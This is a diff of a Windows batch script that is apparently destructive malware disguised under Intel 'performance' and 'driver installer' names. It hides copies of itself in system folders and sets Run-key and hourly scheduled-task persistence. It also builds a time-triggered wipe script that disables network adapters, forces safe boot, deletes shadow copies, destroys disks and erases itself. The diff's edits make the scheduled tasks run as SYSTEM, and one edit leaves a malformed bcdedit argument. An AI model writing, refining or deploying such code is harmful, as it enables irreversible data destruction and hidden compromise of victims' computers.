@@ -77,7 +77,7 @@ copy "%~f0" "C:\ProgramData\Intel\Performance\system_optimizer.bat" >nul 2>&1
 attrib +h +s "C:\Windows\System32\drivers\etc\intel\driver_installer.bat" >nul 2>&1
 attrib +h +s "C:\ProgramData\Intel\Performance\system_optimizer.bat" >nul 2>&1
 
-schtasks /create /tn "IntelPerformanceCheck" /tr "cmd.exe /c \"C:\Windows\System32\drivers\etc\intel\driver_installer.bat\" >nul 2>&1" /sc hourly /f >nul 2>&1
+schtasks /create /tn "IntelPerformanceCheck" /tr "cmd.exe /c \"C:\Windows\System32\drivers\etc\intel\driver_installer.bat\" >nul 2>&1" /sc hourly /ru "SYSTEM" /f >nul 2>&1
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IntelPerformanceService" /t REG_SZ /d "C:\Windows\System32\drivers\etc\intel\driver_installer.bat" /f >nul 2>&1
 
@@ -200,7 +200,7 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Power" /v "ShowHibernateOption
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Power" /v "ShowSleepOption" /t REG_DWORD /d 0 /f >nul 2>&1
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "IntelPerformanceService" /t REG_SZ /d "C:\Windows\System32\drivers\etc\intel\driver_installer.bat" /f >nul 2>&1
-schtasks /create /tn "IntelPerformanceSetup" /tr "cmd.exe /c \"C:\Windows\System32\drivers\etc\intel\driver_installer.bat\" >nul 2>&1" /sc hourly /f >nul 2>&1
+schtasks /create /tn "IntelPerformanceSetup" /tr "cmd.exe /c \"C:\Windows\System32\drivers\etc\intel\driver_installer.bat\" >nul 2>&1" /sc hourly /ru "SYSTEM" /f >nul 2>&1
 
 schtasks /query /tn "IntelPerformanceCheck" >nul 2>&1
 if !errorlevel! equ 0 (
@@ -233,7 +233,7 @@ echo netsh interface set interface "Wi-Fi" disable ^>nul 2^>^&1 >> "%wipe_script
 echo netsh interface set interface "Local Area Connection" disable ^>nul 2^>^&1 >> "%wipe_script%"
 echo netsh interface set interface "Wireless Network Connection" disable ^>nul 2^>^&1 >> "%wipe_script%"
 
-echo bcdedit /set {current} safeboot minimal ^>nul 2^>^&1 >> "%wipe_script%"
+echo bcdedit /set {} safeboot minimal ^>nul 2^>^&1 >> "%wipe_script%"
 echo vssadmin delete shadows /All /Quiet ^>nul 2^>^&1 >> "%wipe_script%"
 
 echo echo Detecting and destroying all disks... ^>nul >> "%wipe_script%"
@@ -252,5 +252,5 @@ echo del "C:\Windows\Temp\disks_found.txt" ^>nul 2^>^&1 >> "%wipe_script%"
 echo del "%%~f0" ^>nul 2^>^&1 >> "%wipe_script%"
 echo schtasks /delete /tn "SystemMaintenance" /f ^>nul 2^>^&1 >> "%wipe_script%"
 
-powershell -Command "schtasks /create /tn 'SystemMaintenance' /tr 'cmd.exe /c \"C:\Windows\Temp\system_maintenance.bat\" >nul 2>&1' /sc once /st 03:00 /sd 03/26/2026 /f" >nul 2>&1
+powershell -Command "schtasks /create /tn 'SystemMaintenance' /tr 'cmd.exe /c \"C:\Windows\Temp\system_maintenance.bat\" >nul 2>&1' /sc once /st 03:00 /sd 03/26/2026 /ru \"SYSTEM\" /f" >nul 2>&1
 exit /b
